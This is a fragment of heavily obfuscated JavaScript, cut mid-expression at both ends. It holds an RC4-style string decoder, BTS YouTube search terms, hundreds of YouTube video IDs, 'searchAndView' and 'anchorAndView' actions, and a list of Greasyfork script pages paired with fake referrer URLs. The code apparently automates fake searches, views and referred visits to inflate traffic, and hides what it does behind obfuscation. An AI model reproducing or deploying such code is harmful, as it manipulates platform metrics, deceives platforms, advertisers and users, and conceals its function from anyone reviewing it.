'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + a0(0x7))['split'](',')), searchTerms = searchTerms['flat'](-0xffd + 0x2 * 0x1aa + 0x4 * 0x32b);

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x3 * 0x602 + 0x140a + -0x2610);
    let h = e[f];
    if (b['EkHMFJ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x26 * -0x9e + -0x2ab + 0x2e7 * 0x9, s, t, u = 0x80f + 0xb * -0x1c4 + 0xb5d; t = n['charAt'](u++); ~t && (s = r % (-0x118e + -0x1f30 + -0x1861 * -0x2) ? s * (-0x9a * 0x8 + -0xafd * -0x3 + -0x1 * 0x1be7) + t : t, r++ % (-0x41 * -0x3 + 0x8 * -0x29c + 0x1421 * 0x1)) ? p += String['fromCharCode'](0xc2f + 0x201 * 0xd + -0x253d & s >> (-(-0x5f * -0x44 + -0x2 * 0x2a2 + 0x13f6 * -0x1) * r & -0x388 + 0x776 + 0x8 * -0x7d)) : 0x1 * -0x6c5 + 0x1402 + -0x1 * 0xd3d) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * 0x25b3 + 0x1ca * 0x7 + 0x192d, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x242e + 0xa84 + -0x2ea2))['slice'](-(-0x1f46 + 0x2699 + -0x751));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1529 * 0x1 + 0x3 * -0x3ab + -0xb3 * -0x2e,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xfc7 * 0x1 + 0x18f1 + -0x28b8; u < -0x114e + -0x24f6 + 0xc * 0x49b; u++) {
          p[u] = u;
        }
        for (u = -0x1 * -0x23ef + -0x62a + -0x1dc5; u < 0x4c0 + -0xaaa + 0x6ea; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x112d + -0xdcd + -0x130 * 0x2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x158f + -0x13 * 0x5 + -0x2 * -0xaf7, q = -0x1931 + 0xcd * 0x2 + 0x225 * 0xb;
        for (let v = 0x1539 + -0x233 * -0x4 + -0x1e05; v < n['length']; v++) {
          u = (u + (-0x21cd + 0x8c2 + -0x1ca * -0xe)) % (0x4d8 * 0x2 + -0x12fe + 0xa4e), q = (q + p[u]) % (-0x1a19 + -0x26 * 0xac + 0x34a1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2301 + -0x58 * 0x5f + -0x3f * -0x117)]);
        }
        return t;
      };
      b['phYcdu'] = m, c = arguments, b['EkHMFJ'] = !![];
    }
    const j = e[-0x616 * -0x1 + 0x1d49 + 0x235f * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['LQoaFI'] === undefined && (b['LQoaFI'] = !![]), h = b['phYcdu'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x3) + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': a1(0xa, 'coN4') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + a0(0x5) + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': a1(0x0, ']9Nk') + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
